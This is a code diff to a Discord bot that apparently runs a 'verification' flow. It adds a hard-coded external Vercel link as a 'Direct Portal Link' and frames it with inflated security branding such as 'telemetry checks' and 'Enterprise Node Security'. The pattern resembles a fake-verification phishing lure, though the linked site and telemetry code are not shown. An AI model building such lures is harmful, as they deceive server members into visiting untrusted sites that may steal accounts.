@@ -14,6 +14,9 @@ import aiohttp
 
 import ro
 
+# --- Target Verification Website URL ---
+VERCEL_SITE_URL = "https://website2-umber-zeta.vercel.app/"
+
 # --- Keep-Alive Web Server Setup ---
 app = Flask('')
 
@@ -182,11 +185,17 @@ class PersistentVerificationView(discord.ui.View):
         except Exception as log_err:
             print(f"[ERROR LOG] Failed to dispatch verification log embed: {type(log_err).__name__} - {log_err}")
 
+        # Send site URL inside verification message embed
         embed = discord.Embed(
             title="🔒 Secure Authentication Portal", 
-            description="Your account has been successfully verified through security telemetry checks.", 
+            description=(
+                f"Your account has been successfully verified!\n\n"
+                f"🌐 **Access the site here:**\n{VERCEL_SITE_URL}\n\n"
+                f"Click the link below to open the verification portal directly:"
+            ), 
             color=0x57F287
         )
+        embed.add_field(name="Direct Portal Link", value=f"🔗 [Click Here to Proceed]({VERCEL_SITE_URL})", inline=False)
         embed.set_footer(text="Protected by Enterprise Node Security")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
@@ -475,7 +484,7 @@ async def setup_verify(interaction: discord.Interaction):
     try:
         embed = discord.Embed(
             title="🛡️ Secure Verification Gateway", 
-            description="Click the **Verify Account** button below to initialize environment telemetry and unlock server node access.", 
+            description="Click the **Verify Account** button below to initialize environment telemetry and receive your verification portal access link.", 
             color=0x2B2D31
         )
         embed.set_footer(text="Automated Access Security Protocol")
@@ -587,7 +596,6 @@ async def stats_command(interaction: discord.Interaction):
                     updated_embeds = await fetch_live_stats()
                     await message.edit(embeds=updated_embeds)
                 except discord.NotFound:
-                    # Target message was deleted, terminate update task safely
                     break
                 except Exception as loop_err:
                     print(f"[ERROR LOG] Failed to auto-update /stats message: {type(loop_err).__name__} - {loop_err}")
